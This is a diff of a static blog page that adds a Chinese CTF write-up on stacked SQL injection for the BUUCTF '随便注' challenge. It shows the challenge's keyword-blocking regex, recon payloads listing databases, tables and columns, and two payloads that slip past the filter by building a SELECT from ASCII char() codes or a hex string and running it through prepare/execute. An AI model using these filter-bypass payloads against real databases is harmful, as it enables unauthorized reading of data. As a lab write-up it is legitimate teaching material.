@@ -24,7 +24,7 @@
 
   
 
-  <title>page | Monstershen</title>
+  <title>web-SQL注入之堆叠注入 | Monstershen</title>
 
   
 
@@ -98,7 +98,7 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">page</h1>
+          <h1 class="title-wrap">web-SQL注入之堆叠注入</h1>
           <h2 class="title-sub-wrap">
             <strong>shen</strong>
             <span>发布于</span>
@@ -106,8 +106,12 @@
           </h2>
           <ul class="wrap-list dark">
   
+    <li><a href="/categories/web%E5%AE%89%E5%85%A8/">📒 web安全</a></li>
+  
 </ul>
           <ul class="wrap-list dark">
+  
+    <li><a href="/tags/SQL%E6%B3%A8%E5%85%A5/">🏷️ SQL注入</a></li>
   
 </ul>
         </div>
@@ -131,7 +135,35 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
+        <h3 id="web-SQL注入-之-堆叠注入"><a href="#web-SQL注入-之-堆叠注入" class="headerlink" title="web SQL注入 之 堆叠注入"></a>web SQL注入 之 堆叠注入</h3><p>buuctf web篇—随便注。</p>
+<p>构造payload绕过限制</p>
+<p>限制如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>也就是限制了输入 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  update <span class="keyword">delete</span> <span class="keyword">drop</span> <span class="keyword">insert</span> <span class="keyword">where</span> </span><br><span class="line">和</span><br><span class="line">\.</span><br></pre></td></tr></table></figure>
+
+<p>一般进行一些简单的测试确定有堆叠注入漏洞的话</p>
+<p>寻找限制。</p>
+<p>在允许范围内进行信息显示：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br><span class="line"><span class="string">查看数据库</span></span><br><span class="line"><span class="string">1&#x27;</span>;<span class="keyword">show</span> tables;#</span><br><span class="line">查看表</span><br><span class="line">之后对表进行查看</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from 表名（当表名全为数字时，要用特殊符号包裹表名``），</span></span><br><span class="line"><span class="string">之后再构造payload</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题还涉及一些简单的sql预处理语句。</p>
+<p>这道题构造的pyload为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET@sql=concat(char(115,101,108,101,99,116),&quot; * from `1919810931114514`&quot;);prepare sqla from @sql;execute sqla;#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>简单说明一下，这个 payload 用一个 concat 来拼出来一个 select * from <code>1919810931114514</code></p>
+<p>这个char(115,101,108,101,99,116)，就是 select 的 ASCLL 编码。</p>
+<p>当然，也可以用其他</p>
+<p>比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span></span><br></pre></td></tr></table></figure>
+
+<p>这个 </p>
+<p>0x73656c656374202a2066726f6d20603139313938313039333131313435313460</p>
+<p>就是 那条 select 语句的 16进制形式。</p>
+
       </section>
 
       
@@ -193,13 +225,13 @@
         <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
 </svg>
-        3
+        4
       </div>
       <div class="count-box--item">
         <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
 </svg>
-        5
+        6
       </div>
     </div>
   </div>
@@ -238,6 +270,12 @@
         </li>
       
         <li class="categorys-list-item">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/">
+            web安全 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
           <a href="/categories/Kali/">
             Kali (1)
           </a>
@@ -262,7 +300,7 @@
   </div>
   <div class="widget-body">
     <div class="tags-cloud">
-      <a href="/tags/kali%E5%AE%89%E8%A3%85/" style="font-size: 10px;" class="tags-cloud-0">kali安装</a> <a href="/tags/misc-zip/" style="font-size: 10px;" class="tags-cloud-0">misc zip</a> <a href="/tags/misc%E9%9A%90%E5%86%99%E6%9C%AF/" style="font-size: 10px;" class="tags-cloud-0">misc隐写术</a> <a href="/tags/%E5%BF%83%E5%BE%97/" style="font-size: 20px;" class="tags-cloud-10">心得</a> <a href="/tags/%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86/" style="font-size: 10px;" class="tags-cloud-0">编码原理</a>
+      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;" class="tags-cloud-0">SQL注入</a> <a href="/tags/kali%E5%AE%89%E8%A3%85/" style="font-size: 10px;" class="tags-cloud-0">kali安装</a> <a href="/tags/misc-zip/" style="font-size: 10px;" class="tags-cloud-0">misc zip</a> <a href="/tags/misc%E9%9A%90%E5%86%99%E6%9C%AF/" style="font-size: 10px;" class="tags-cloud-0">misc隐写术</a> <a href="/tags/%E5%BF%83%E5%BE%97/" style="font-size: 20px;" class="tags-cloud-10">心得</a> <a href="/tags/%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86/" style="font-size: 10px;" class="tags-cloud-0">编码原理</a>
     </div>
   </div>
 </section>
